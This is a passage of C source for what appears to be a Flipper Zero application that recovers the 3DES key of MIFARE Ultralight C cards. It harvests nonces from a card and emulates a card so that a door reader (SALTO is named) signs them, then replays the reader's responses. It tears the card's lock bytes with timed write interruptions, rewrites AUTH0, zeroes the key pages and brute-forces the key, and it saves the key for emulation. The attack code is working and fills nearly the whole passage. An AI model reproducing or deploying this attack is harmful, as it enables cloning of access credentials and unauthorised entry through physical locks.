        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 3) AUTH1 command (0x1A 0x00)
    {
        uint8_t auth1_cmd[2] = {0x1A, 0x00};
        if(!send_receive_command_full(
               handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }

        // Expect 10 bytes + 1st byte = 0xAF => 11 bytes => 88 bits
        if(rx_bits != 88 || rx_buffer[0] != 0xAF) {
            //FURI_LOG_E(TAG, "Invalid AUTH1 response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Extract encrypted RndB from AUTH1 response
    memcpy(app->auth1_response, rx_buffer + 1, 8);
    app->card_present = true; // fork: the card responded through AUTH1
    // fork: NO logging here -- this sits between AUTH-1 and AUTH-2, and a serial print
    // delays AUTH-2 past the card's auth-session timeout, causing a NAK. Keep it silent.

    // fork: match the card's nonce against ANY signed candidate, then replay that
    // candidate's reader-AUTH2. The card's dominant nonce shifts per power session, so a
    // single target rarely recurs -- but one of the signed candidates almost always does.
    int match = -1;
    for(uint8_t ci = 0; ci < app->num_candidates; ci++) {
        if(app->cand_signed[ci] && memcmp(app->nonces[ci].nonce, app->auth1_response, 8) == 0) {
            match = ci;
            break;
        }
    }
    if(match < 0) {
        return false;
    }

    // Replay the reader's AUTH2 captured for this candidate
    uint8_t auth2_cmd[17];
    auth2_cmd[0] = 0xAF;
    memcpy(auth2_cmd + 1, app->cand_response[match], 16);
    bool got = send_receive_command_full(
        handle, auth2_cmd, 17 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true);
    // Only rx_bits are valid. A four-bit response is an Ultralight ACK/NAK, not an
    // eleven-byte AUTH2 response.
    if(got && rx_bits == 4) {
        FURI_LOG_I(TAG, "AUTH2 replay cand %d: NAK/ACK nibble=%X", match, rx_buffer[0] & 0x0F);
    } else if(got && rx_bits == 88) {
        FURI_LOG_I(
            TAG,
            "AUTH2 replay cand %d: 88-bit status=%02X data=%02X%02X%02X%02X%02X%02X%02X%02X",
            match,
            rx_buffer[0],
            rx_buffer[1],
            rx_buffer[2],
            rx_buffer[3],
            rx_buffer[4],
            rx_buffer[5],
            rx_buffer[6],
            rx_buffer[7],
            rx_buffer[8]);
    } else {
        FURI_LOG_I(TAG, "AUTH2 replay cand %d: got=%d bits=%d", match, (int)got, (int)rx_bits);
    }
    if(!got) {
        return false;
    }

    // Ensure we've authenticated successfully (card -> 0x00 + ek(RndA') on success)
    if(rx_bits != 88 || rx_buffer[0] != 0x00) {
        return false;
    }

    return true;
}

static bool attempt_tear_lockbytes(const FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // First, make sure lock bytes need to be torn
    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x28};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Save auth0 config value in app context to restore later
    app->auth0_config_restore = rx_buffer[8];
    FURI_LOG_I(
        TAG,
        "Config before recovery: lock=%02X%02X AUTH0=%02X ACCESS=%02X",
        rx_buffer[0],
        rx_buffer[1],
        rx_buffer[8],
        rx_buffer[12]);

    // Check if tearing is required
    // TODO: Technically if AUTH0 is already 30 (in block 42) we don't care about the 3rd bit of lock byte 1
    bool lock_byte_tearing_required = (((rx_buffer[1] & 0x80) >> 7)) |
                                      (((rx_buffer[1] & 0x20) >> 5));
    if(!lock_byte_tearing_required) {
        FURI_LOG_I(TAG, "Lock bytes do not need tearing");
        return true;
    }
    if(!app->lock_bytes_reset) {
        // Save lock byte values in app context to restore later
        app->lock_bytes_restore[0] = rx_buffer[0];
        app->lock_bytes_restore[1] = rx_buffer[1];
        app->lock_bytes_reset = true;
        /* Persist original bytes before the first irreversible tearing write. */
        if(!ulcfkey_session_save(app)) {
            FURI_LOG_E(TAG, "Cannot checkpoint original configuration");
            return false;
        }
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // Tear lock bytes by interrupting a write with a specific delay
    // https://github.com/RfidResearchGroup/proxmark3/blob/3b97acfefe22c976718ed1c214d514ce889f9ac8/armsrc/mifarecmd.c#L3798
    FURI_LOG_I(TAG, "Tearing lock bytes with delay: %lu us", app->tear_delay);
    {
        uint8_t write_cmd[6] = {CMD_WRITE_PAGE, 0x28, 0x00, 0x00, 0x00, 0x00};
        if(!send_receive_command_tear(handle, write_cmd, 48, app->tear_delay, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }
    }

    // Return false until the lock bytes are torn
    return false;
}

static bool overwrite_auth0_config(const FuriHalSpiBusHandle* handle, AppContext* app) {
    UNUSED(app);
    uint8_t rx_buffer[32];
    uint8_t rx_buffer2[32];
    size_t rx_bits = 0;
    size_t rx_bits2 = 0;

    uint8_t write_cmd[6] = {CMD_WRITE_PAGE, 0x2A, 0x30, 0x00, 0x00, 0x00};
    bool write_ok = send_receive_command_full(
        handle, write_cmd, 48, rx_buffer, sizeof(rx_buffer), &rx_bits, true);
    if(!write_ok || rx_bits != 4 || (rx_buffer[0] & 0x0F) != 0x0A) {
        FURI_LOG_E(
            TAG,
            "AUTH0 write failed: got=%d bits=%u nibble=%X",
            (int)write_ok,
            (unsigned)rx_bits,
            rx_buffer[0] & 0x0F);
        return false;
    }

    // READ(0x2A) returns pages 0x2A-0x2D, so AUTH0 is response byte zero.
    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x2A};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer2, sizeof(rx_buffer2), &rx_bits2, true) ||
       rx_bits2 != (18 * 8)) {
        FURI_LOG_E(TAG, "AUTH0 verification read failed: bits=%u", (unsigned)rx_bits2);
        return false;
    }

    FURI_LOG_I(TAG, "AUTH0 verification value=%02X", rx_buffer2[0]);
    if(rx_buffer2[0] != 0x30) {
        FURI_LOG_E(TAG, "AUTH0 is not 30 (got %02X)", rx_buffer2[0]);
        return false;
    }

    return true;
}

// Function to collect single nonce
static bool
    collect_single_nonce(const FuriHalSpiBusHandle* handle, AppContext* app, uint8_t* nonce) {
    // Shutdown NFC field
    disable_nfc_field(handle);

    // Enable NFC field
    setup_nfc_field(handle);

    // Collect nonce
    if(!collect_auth1_challenge(handle, app, true)) {
        FURI_LOG_E(TAG, "Failed to collect nonce");
        return false;
    }

    // Save nonce
    memcpy(nonce, app->auth1_response, 8);

    return true;
}

static bool save_nonces_to_file(AppContext* app);

// Function to overwrite the key page index with 00000000
static bool
    overwrite_key_page(const FuriHalSpiBusHandle* handle, AppContext* app, uint8_t key_index) {
    UNUSED(app);
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
    if(!send_receive_command_full(
           handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
        //FURI_LOG_E(TAG, "Read page transmit failed");
        return false;
    }
    // Expect 16 bytes + CRC => 18 bytes => 144 bits
    if(rx_bits != (18 * 8)) {
        //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    uint8_t write_cmd[6] = {0xA2, 0x2C + key_index, 0x00, 0x00, 0x00, 0x00};
    bool got = send_receive_command_full(
        handle, write_cmd, 48, rx_buffer, sizeof(rx_buffer), &rx_bits, true);
    if(!got || rx_bits != 4 || (rx_buffer[0] & 0x0F) != 0x0A) {
        FURI_LOG_E(
            TAG,
            "Key page %02X write failed: got=%d bits=%u nibble=%X",
            0x2C + key_index,
            (int)got,
            (unsigned)rx_bits,
            rx_buffer[0] & 0x0F);
        return false;
    }

    FURI_LOG_I(TAG, "Key page %02X overwritten with zeros", 0x2C + key_index);
    return true;
}

// Function to collect nonces
static bool collect_nonces(const FuriHalSpiBusHandle* handle, AppContext* app) {
    // Array of nonce pointers
    uint8_t* nonces[] = {app->nonce_100, app->nonce_75, app->nonce_50, app->nonce_25};

    // Loop through each nonce collection and key page overwrite
    for(int i = 0; i < 4; i++) {
        app->crack_key_idx = (uint8_t)i; // fork: UI progress
        view_port_update(app->view_port);
        if((app->recovery_nonce_mask & (1U << i)) == 0) {
            if(!collect_single_nonce(handle, app, nonces[i])) {
                FURI_LOG_E(TAG, "Failed to collect %d nonce", 100 - (i * 25));
                return false;
            }
            app->recovery_nonce_mask |= (1U << i);
            app->session_stage = SessionStageRecoveryNonces;
            if(!save_nonces_to_file(app) || !ulcfkey_session_save(app)) {
                FURI_LOG_E(TAG, "Failed to save checkpoint before key page %d", i);
                return false;
            }
        }

        if((app->key_pages_zeroed_mask & (1U << i)) == 0) {
            if(!overwrite_key_page(handle, app, i)) {
                FURI_LOG_E(TAG, "Failed to overwrite key page %d", i);
                return false;
            }
            app->key_pages_zeroed_mask |= (1U << i);
            if(!ulcfkey_session_save(app)) return false;
        }
    }

    return true;
}

static uint8_t ulcfkey_workflow_section(const AppContext* app) {
    switch(app->state) {
    case AppStateCollectNTReady:
    case AppStateCollectNTInit:
    case AppStateCollectNTWaiting:
        return 1;
    case AppStateCollectNRReady:
    case AppStateCollectNRInit:
    case AppStateCollectNRWaiting:
        return 2;
    case AppStateCrackReady:
    case AppStateCrackInit:
    case AppStateCrackInitialAuth:
        return 3;
    case AppStateCrackTearLockbytes:
    case AppStateCrackOverwriteAuth0:
        return 4;
    case AppStateCrackCollectNonces:
    case AppStateCrackResumeInit:
        return 5;
    case AppStateRecoverKeyReady:
    case AppStateRecoverKeyRunning:
        return 6;
    case AppStateRestoreReady:
    case AppStateRestoreRunning:
        return 8;
    case AppStateComplete:
        return app->session_stage == SessionStageRestored ? 8 : 7;
    default:
        return 0;
    }
}

static uint8_t ulcfkey_saved_section(const AppContext* app) {
    switch((SessionStage)app->session_stage) {
    case SessionStageEmpty:
        return 1;
    case SessionStageNtCollected:
        return 2;
    case SessionStageNrCollected:
    case SessionStageAuthenticatedDump:
        return 3;
    case SessionStageUnlocked:
    case SessionStageRecoveryNonces:
        return 5;
    case SessionStageBruteforce:
    case SessionStageKeyRecovered:
        return 6;
    case SessionStageEmulationSaved:
        return 7;
    case SessionStageRestored:
        return 8;
    default:
        return 1;
    }
}

static void ulcfkey_draw_workflow_header(Canvas* canvas, const AppContext* app) {
    uint8_t section = ulcfkey_workflow_section(app);
    if(section == 0) return;
    char header[24];
    snprintf(header, sizeof(header), "Section %u/8", section);
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 2, 8, header);
    elements_progress_bar(canvas, 58, 2, 68, (float)section / 8.0f);
}

static uint8_t ulcfkey_count_bits4(uint8_t value) {
    uint8_t count = 0;
    for(uint8_t i = 0; i < 4; i++)
        count += (value >> i) & 1U;
    return count;
}

static void ulcfkey_draw_menu_row(
    Canvas* canvas,
    uint8_t index,
    uint8_t selected,
    int32_t y,
    const char* label) {
    if(index == selected) {
        canvas_set_color(canvas, ColorBlack);
        canvas_draw_rbox(canvas, 1, y - 10, 124, 13, 2);
        canvas_set_color(canvas, ColorWhite);
        canvas_draw_str(canvas, 7, y, label);
        canvas_set_color(canvas, ColorBlack);
    } else {
        canvas_draw_str(canvas, 7, y, label);
    }
}

static bool ulcfkey_saved_card_filename(const char* name) {
    const size_t prefix_len = strlen(ULCFKEY_SAVED_CARD_PREFIX);
    if(strncmp(name, ULCFKEY_SAVED_CARD_PREFIX, prefix_len) ||
       strlen(name) != prefix_len + 14 + strlen(NFC_APP_EXTENSION) ||
       strcmp(name + prefix_len + 14, NFC_APP_EXTENSION)) {
        return false;
    }
    for(size_t i = prefix_len; i < prefix_len + 14; i++) {
        if(!((name[i] >= '0' && name[i] <= '9') ||
             (name[i] >= 'A' && name[i] <= 'F') ||
             (name[i] >= 'a' && name[i] <= 'f'))) {
            return false;
        }
    }
    return true;
}

static bool ulcfkey_saved_card_find(uint16_t index, char* selected, size_t selected_size, uint16_t* count) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* dir = storage_file_alloc(storage);
    bool found = false;
    *count = 0;
    if(storage_dir_open(dir, NFC_APP_FOLDER)) {
        FileInfo info;
        char name[64];
        while(storage_dir_read(dir, &info, name, sizeof(name))) {
            if((info.flags & FSF_DIRECTORY) || !ulcfkey_saved_card_filename(name)) continue;
            if(*count == index && selected && selected_size > strlen(name)) {
                strcpy(selected, name);
                found = true;
            }
            if(*count < UINT16_MAX) (*count)++;
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
    furi_record_close(RECORD_STORAGE);
    return found;
}

static void ulcfkey_saved_card_refresh(AppContext* app) {
    app->saved_card_name[0] = '\0';
    ulcfkey_saved_card_find(
        app->saved_card_selection,
        app->saved_card_name,
        sizeof(app->saved_card_name),
        &app->saved_card_count);
    if(app->saved_card_selection >= app->saved_card_count) {
        app->saved_card_selection = app->saved_card_count ? app->saved_card_count - 1 : 0;
        if(app->saved_card_count) {
            ulcfkey_saved_card_find(
                app->saved_card_selection,
                app->saved_card_name,
                sizeof(app->saved_card_name),
                &app->saved_card_count);
        }
    }
}

static void ulcfkey_saved_card_open(AppContext* app) {
    app->saved_card_loaded = false;
    if(!app->saved_card_name[0]) return;

    FuriString* path = furi_string_alloc_printf(NFC_APP_FOLDER "/%s", app->saved_card_name);
    NfcDevice* device = nfc_device_alloc();
    if(nfc_device_load(device, furi_string_get_cstr(path)) &&
       nfc_device_get_protocol(device) == NfcProtocolMfUltralight) {
        const MfUltralightData* data = nfc_device_get_data(device, NfcProtocolMfUltralight);
        size_t uid_len;
        const uint8_t* uid = iso14443_3a_get_uid(data->iso14443_3a_data, &uid_len);
        if(data->type == MfUltralightTypeMfulC && data->pages_read >= 48 && uid_len == 7) {
            memcpy(app->saved_card_uid, uid, sizeof(app->saved_card_uid));
            for(size_t page = 0; page < 4; page++) {
                memcpy(app->saved_card_key + page * 4, data->page[44 + page].data, 4);
            }
            app->saved_card_loaded = true;
        }
    }
    nfc_device_free(device);
    furi_string_free(path);
    app->state = AppStateSavedCardDetail;
}

static void render_callback(Canvas* canvas, void* ctx) {
    AppContext* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(app->state == AppStateMain || app->state == AppStateHelp ||
       app->state == AppStateSavedCards || app->state == AppStateSavedCardDetail ||
       app->state == AppStateNewConfirm || app->state == AppStateError) {
        canvas_draw_str(canvas, 2, 12, "ULCFKey Recovery");
    } else {
        ulcfkey_draw_workflow_header(canvas, app);
    }

    canvas_set_font(canvas, FontSecondary);
    switch(app->state) {
    case AppStateMain: {
        char first_item[32];
        if(app->session_loaded) {
            snprintf(
                first_item,
                sizeof(first_item),
                "Resume session [%u/8]",
                ulcfkey_saved_section(app));
        } else {
            snprintf(first_item, sizeof(first_item), "Start attack");
        }
        ulcfkey_draw_menu_row(canvas, 0, app->menu_selection, 23, first_item);
        ulcfkey_draw_menu_row(canvas, 1, app->menu_selection, 36, "New session");
        ulcfkey_draw_menu_row(canvas, 2, app->menu_selection, 49, "Saved cards");
        ulcfkey_draw_menu_row(canvas, 3, app->menu_selection, 62, "Help");
        elements_scrollbar_pos(canvas, 127, 17, 43, app->menu_selection, 4);
        break;
    }
    case AppStateSavedCards: {
        char line[32];
        snprintf(line, sizeof(line), "Saved cards: %u", app->saved_card_count);
        canvas_draw_str(canvas, 2, 26, line);
        if(app->saved_card_count) {
            if(app->saved_card_name[0]) {
                canvas_draw_str(
                    canvas, 2, 40, app->saved_card_name + strlen(ULCFKEY_SAVED_CARD_PREFIX));
            }
            snprintf(
                line,
                sizeof(line),
                "%u/%u  Up/Down  OK: View",
                app->saved_card_selection + 1,
                app->saved_card_count);
            canvas_draw_str(canvas, 2, 57, line);
        } else {
            canvas_draw_str(canvas, 2, 42, "No recovered cards yet");
        }
        break;
    }
    case AppStateSavedCardDetail: {
        if(!app->saved_card_loaded) {
            canvas_draw_str(canvas, 2, 32, "Could not load card");
            break;
        }
        char line[32];
        snprintf(
            line,
            sizeof(line),
            "UID: %02X%02X%02X%02X%02X%02X%02X",
            app->saved_card_uid[0], app->saved_card_uid[1], app->saved_card_uid[2],
            app->saved_card_uid[3], app->saved_card_uid[4], app->saved_card_uid[5],
            app->saved_card_uid[6]);
        canvas_draw_str(canvas, 2, 25, line);
        canvas_draw_str(canvas, 2, 38, "Key:");
        for(size_t half = 0; half < 2; half++) {
            snprintf(
                line, sizeof(line), "%02X%02X%02X%02X%02X%02X%02X%02X",
                app->saved_card_key[half * 8], app->saved_card_key[half * 8 + 1],
                app->saved_card_key[half * 8 + 2], app->saved_card_key[half * 8 + 3],
                app->saved_card_key[half * 8 + 4], app->saved_card_key[half * 8 + 5],
                app->saved_card_key[half * 8 + 6], app->saved_card_key[half * 8 + 7]);
            canvas_draw_str(canvas, 2, 48 + half * 12, line);
        }
        break;
    }
    case AppStateNewConfirm:
        canvas_draw_str(canvas, 2, 29, "Delete saved progress?");
        canvas_draw_str(canvas, 2, 42, "This cannot be undone.");
        elements_button_left(canvas, "Cancel");
        elements_button_right(canvas, "Delete");
        break;
    case AppStateHelp:
        elements_scrollbar_pos(
            canvas, 128, 12, 48, app->help_state->scroll_pos, app->help_state->scroll_num);

        // Draw text line by line
        canvas_set_font(canvas, FontSecondary);
        const char* text = furi_string_get_cstr(app->help_state->text);
        const char* line_start = text;
        uint8_t y = 24; // Start y position

        // Draw each line with scroll offset
        while(*line_start) {
            const char* line_end = strchr(line_start, '\n');
            if(!line_end) line_end = line_start + strlen(line_start);

            // Only draw lines that are visible (after scroll offset)
            int line_y = y - (app->help_state->scroll_pos * 12);
            if(line_y >= 24 && line_y < 64) {
                char line_buf[128];
                size_t line_len = line_end - line_start;
                strncpy(line_buf, line_start, line_len);
                line_buf[line_len] = '\0';
                canvas_draw_str(canvas, 2, line_y, line_buf);
            }

            y += 12; // Move to next line position
            if(!*line_end) break;
            line_start = line_end + 1; // Skip the newline
        }
        break;
    case AppStateCollectNTReady:
        canvas_draw_str(canvas, 2, 24, "Place Flipper against card");
        elements_button_center(canvas, "Collect NT");
        break;
    case AppStateCollectNRReady:
        canvas_draw_str(canvas, 2, 24, "Place Flipper against reader");
        elements_button_center(canvas, "Collect NR");
        break;
    case AppStateCollectNTInit:
    case AppStateCollectNTWaiting: {
        char buffer[32];
        char buffer_unique[32];
        snprintf(buffer, sizeof(buffer), "Collecting NT: %lu/%u", app->total_nonces, MAX_NONCES);
        snprintf(buffer_unique, sizeof(buffer_unique), "Unique: %u", app->unique_nonces);
        canvas_draw_str(canvas, 2, 24, buffer);
        canvas_draw_str(canvas, 2, 36, buffer_unique);
        elements_progress_bar(canvas, 2, 43, 124, (float)app->total_nonces / (float)MAX_NONCES);
        break;
    }
    case AppStateCollectNRInit:
    case AppStateCollectNRWaiting: {
        const char* dots = "   ";
        switch((app->anim_tick / 3) % 4) {
        case 1:
            dots = ".  ";
            break;
        case 2:
            dots = ".. ";
            break;
        case 3:
            dots = "...";
            break;
        default:
            break;
        }
        char nb[32];
        snprintf(nb, sizeof(nb), "Waiting for reader%s", dots);
        canvas_draw_str(canvas, 2, 24, nb);
        char nsb[32];
        snprintf(nsb, sizeof(nsb), "signed %u/%u", app->cand_signed_count, app->num_candidates);
        canvas_draw_str(canvas, 2, 36, nsb);
        elements_progress_bar(
            canvas,
            2,
            43,
            124,
            app->num_candidates ? (float)app->cand_signed_count / app->num_candidates : 0.0f);
        break;
    }
    case AppStateCrackReady:
        canvas_draw_str(canvas, 2, 24, "SACRIFICIAL CARD ONLY");
        elements_button_center(canvas, "Destroy + Recover");
        break;
    case AppStateCrackInit:
    case AppStateCrackInitialAuth: {
        char ab[32];
        canvas_draw_str(
            canvas, 2, 24, app->card_present ? "Authenticating..." : "Place card on Flipper");
        snprintf(ab, sizeof(ab), "attempt %lu", (unsigned long)app->auth_attempts);
        canvas_draw_str(canvas, 2, 36, ab);
        break;
    }
    case AppStateCrackTearLockbytes: {
        char tb[32];
        snprintf(
            tb,
            sizeof(tb),
            "delay %luus  try %lu",
            (unsigned long)app->tear_delay,
            (unsigned long)app->tear_attempts);
        canvas_draw_str(canvas, 2, 24, "Tearing lock bytes...");
        canvas_draw_str(canvas, 2, 36, tb);
        canvas_draw_str(canvas, 2, 49, "Timing search: indeterminate");
        break;
    }
    case AppStateCrackOverwriteAuth0:
        canvas_draw_str(canvas, 2, 24, "Overwriting AUTH0...");
        break;
    case AppStateCrackCollectNonces: {
        static const uint16_t pct[4] = {100, 75, 50, 25};
        char cb[32];
        uint16_t pc = (app->crack_key_idx < 4) ? pct[app->crack_key_idx] : 0;
        snprintf(cb, sizeof(cb), "key %u%% (%u/4)", pc, (unsigned)(app->crack_key_idx + 1));
        canvas_draw_str(canvas, 2, 24, "Collecting nonces...");
        canvas_draw_str(canvas, 2, 36, cb);
        uint8_t finished = ulcfkey_count_bits4(app->recovery_nonce_mask) +
                           ulcfkey_count_bits4(app->key_pages_zeroed_mask);
        elements_progress_bar(canvas, 2, 43, 124, (float)finished / 8.0f);
        break;
    }
    case AppStateCrackResumeInit:
        canvas_draw_str(canvas, 2, 24, "Resume: place card");
        break;
    case AppStateRecoverKeyReady:
        canvas_draw_str(canvas, 2, 24, "Offline key recovery");
        canvas_draw_str(canvas, 2, 36, "May take many hours");
        elements_button_center(canvas, "Run");
        break;
    case AppStateRecoverKeyRunning: {
        char rb[32];
        char activity[32];
        static const char spinner[] = "|/-\\";
        uint32_t elapsed_ticks = furi_get_tick() - app->brute_run_start_tick;
        uint32_t elapsed_seconds = elapsed_ticks / furi_kernel_get_tick_frequency();
        uint32_t searched = app->brute.next_candidate - app->brute_run_start_candidate;
        uint32_t rate = elapsed_seconds ? searched / elapsed_seconds : 0;
        uint32_t hundredths =
            (uint32_t)(((uint64_t)app->brute.next_candidate * 10000U) / ULCFKEY_BRUTE_SPACE);
        snprintf(
            rb,
            sizeof(rb),
            "segment %u/4  %lu.%02lu%%",
            (unsigned)(app->brute.phase + 1),
            (unsigned long)(hundredths / 100U),
            (unsigned long)(hundredths % 100U));
        snprintf(
            activity,
            sizeof(activity),
            "%c %lu tested  %lu/s",
            spinner[app->anim_tick & 3U],
            (unsigned long)app->brute.next_candidate,
            (unsigned long)rate);
        canvas_draw_str(canvas, 2, 22, rb);
        canvas_draw_str(canvas, 2, 34, activity);
        elements_progress_bar(
            canvas, 2, 43, 124, (float)ulcfkey_brute_percent(&app->brute) / 100.0f);
        elements_button_left(canvas, "Pause");
        break;
    }
    case AppStateRestoreReady:
        canvas_draw_str(canvas, 2, 24, "Restore original card?");
        canvas_draw_str(canvas, 2, 36, "UID is checked first");
        elements_button_center(canvas, "Restore");
        break;
    case AppStateRestoreRunning:
        canvas_draw_str(canvas, 2, 24, "Restoring card...");
        {
            char restore_status[24];
            snprintf(restore_status, sizeof(restore_status), "step %u/7", app->restore_step);
            canvas_draw_str(canvas, 2, 36, restore_status);
            elements_progress_bar(canvas, 2, 43, 124, (float)app->restore_step / 7.0f);
        }
        break;
    case AppStateComplete:
        if(app->auth_ok_safe_stop) {
            canvas_draw_str(canvas, 2, 24, "Auth OK - no writes");
        } else if(app->session_stage == SessionStageRestored) {
            canvas_draw_str(canvas, 2, 24, "Card restored");
        } else {
            canvas_draw_str(canvas, 2, 24, "Key + emulation saved");
            elements_button_center(canvas, "Restore card");
        }
        break;
    case AppStateError:
        canvas_draw_str(canvas, 2, 24, "Error!");
        if(app->error) canvas_draw_str(canvas, 2, 36, app->error);
        break;
    }
}

static void input_callback(InputEvent* input_event, void* ctx) {
    furi_assert(ctx);
    AppContext* app = ctx;
    AppEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(app->event_queue, &event, FuriWaitForever);
}

NfcCommand ulcfkey_listener_callback(NfcGenericEvent event, void* context) {
    AppContext* app = context;
    NfcCommand command = NfcCommandContinue;
    Iso14443_3aListenerEvent* Iso14443_3a_event = event.event_data;
    if(Iso14443_3a_event->type == Iso14443_3aListenerEventTypeReceivedStandardFrame) {
        BitBuffer* buffer = Iso14443_3a_event->data->buffer;
        const uint8_t* data = bit_buffer_get_data(buffer);
        size_t data_len = bit_buffer_get_size_bytes(buffer);
        for(size_t i = 0; i < data_len; i++) {
            FURI_LOG_D(TAG, "Received data: %02X", data[i]);
        }
        if(data_len == 2 && data[0] == 0x1A && data[1] == 0x00) {
            FURI_LOG_I(TAG, "Received AUTH request from reader");
            // Send AUTH-1 reply back to the reader, response must begin with 0xAF
            BitBuffer* auth1_buffer = bit_buffer_alloc(11);
            bit_buffer_append_byte(auth1_buffer, 0xAF);
            // fork: present the candidate nonce currently being signed
            uint8_t ci = (app->nr_sign_idx < app->num_candidates) ? app->nr_sign_idx : 0;
            app->nr_pending_idx = ci;
            app->nr_candidate_pending = true;
            bit_buffer_append_bytes(auth1_buffer, app->nonces[ci].nonce, 8);
            // Append the CRC
            const uint8_t* response_data = bit_buffer_get_data(auth1_buffer);
            uint16_t crc = calculate_crc16((uint8_t*)response_data, 9);
            bit_buffer_append_byte(auth1_buffer, crc & 0xFF);
            bit_buffer_append_byte(auth1_buffer, (crc >> 8) & 0xFF);
            NfcError error = nfc_listener_tx(event.instance, auth1_buffer);
            if(error != NfcErrorNone) {
                FURI_LOG_E(TAG, "Tx error");
            }
            bit_buffer_free(auth1_buffer);
        } else if(data_len == 2 && data[0] == CMD_READ_PAGE) {
            // fork: answer READ(page) with 16 bytes (4 pages) from the dumped card data,
            // so a reader that reads before authenticating (SALTO reads page 2) proceeds
            // to send 1A -- which we answer above with the common nonce.
            uint8_t page = data[1];
            BitBuffer* read_buffer = bit_buffer_alloc(18);
            for(uint8_t i = 0; i < 16; i++) {
                uint8_t pg = page + (i / 4);
                uint8_t b = (pg < 48) ? app->card_pages[pg].data[i % 4] : 0x00;
                bit_buffer_append_byte(read_buffer, b);
            }
            const uint8_t* rd = bit_buffer_get_data(read_buffer);
            uint16_t rcrc = calculate_crc16((uint8_t*)rd, 16);
            bit_buffer_append_byte(read_buffer, rcrc & 0xFF);
            bit_buffer_append_byte(read_buffer, (rcrc >> 8) & 0xFF);
            NfcError rerr = nfc_listener_tx(event.instance, read_buffer);
            if(rerr != NfcErrorNone) {
                FURI_LOG_E(TAG, "READ Tx error");
            }
            bit_buffer_free(read_buffer);
        } else if(data_len == 17 && data[0] == 0xAF) {
            // fork: this AUTH2 is the reader's response to the candidate we presented in
            // the preceding 1A. Store it per-candidate so Crack can replay whichever nonce
            // the card later produces.
            // A reader may retransmit AUTH2 because this emulation intentionally does
            // not complete authentication. Bind the response to the most recent AUTH1;
            // otherwise a duplicate AUTH2 gets incorrectly assigned to the next nonce.
            if(!app->nr_candidate_pending) {
                FURI_LOG_W(TAG, "Ignoring AUTH2 without a pending AUTH1");
                return command;
            }
            uint8_t sci = app->nr_pending_idx;
            app->nr_candidate_pending = false;
            if(sci < app->num_candidates && !app->cand_signed[sci]) {
                memcpy(app->cand_response[sci], data + 1, 16);
                app->cand_signed[sci] = true;
                app->cand_signed_count++;
                FURI_LOG_I(
                    TAG, "Signed candidate %u/%u", app->cand_signed_count, app->num_candidates);
            }
            while(app->nr_sign_idx < app->num_candidates && app->cand_signed[app->nr_sign_idx]) {
                app->nr_sign_idx++;
            }
            if(app->cand_signed_count >= app->num_candidates) {
                app->auth2_received = true;
            }
        }
    }
    return command;
}

static NfcDevice* ultralight_c_nfc_device_alloc(const uint8_t uid[]) {
    const uint8_t atqa[] = {0x44, 0x00};

    Iso14443_3aData* iso14443_3a_edit_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(iso14443_3a_edit_data, uid, 7);
    iso14443_3a_set_sak(iso14443_3a_edit_data, 0);
